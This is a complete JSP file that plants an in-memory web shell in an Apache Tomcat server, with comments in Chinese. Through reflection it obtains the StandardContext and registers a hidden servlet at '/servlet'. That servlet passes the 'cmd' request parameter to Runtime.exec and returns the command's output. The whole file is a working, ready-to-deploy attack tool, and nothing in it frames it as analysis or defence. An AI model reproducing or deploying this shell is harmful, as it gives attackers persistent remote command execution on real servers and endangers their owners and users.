<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedInputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java"%>
<%!
    public class Servlet_memshell extends HttpServlet {
        private String message;

        public void init() {
            message = "Servlet 命令执行输出：\n";
        }

        public void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if(cmd != null) {
                try {
                    InputStream ins = Runtime.getRuntime().exec(cmd).getInputStream();
                    BufferedInputStream bins = new BufferedInputStream(ins);
                    resp.setContentType("text/html;charset=UTF-8");
                    resp.getWriter().write(message);
                    int len;
                    while ((len = bins.read()) != -1) {
                        resp.getWriter().write(len);
                    }
                }catch (Exception e){
                    resp.getWriter().println(e.getMessage());
                }
            }
        }

        public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            super.doPost(req, resp);
        }
    }

%>
<%
    // 获得StandardContext
    Field reqF=request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardCcontext = (StandardContext) req.getContext();

    // 创建Wrapper
    Servlet_memshell servlet_memshell = new Servlet_memshell();
    Wrapper wrapper = standardCcontext.createWrapper();
    String name = servlet_memshell.getClass().getSimpleName();
    wrapper.setName(name);
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(servlet_memshell);
    wrapper.setServletClass(servlet_memshell.getClass().getName());

    // 将Wrapper添加到StandardContext
    standardCcontext.addChild(wrapper);
    standardCcontext.addServletMappingDecoded("/servlet",name);
%>

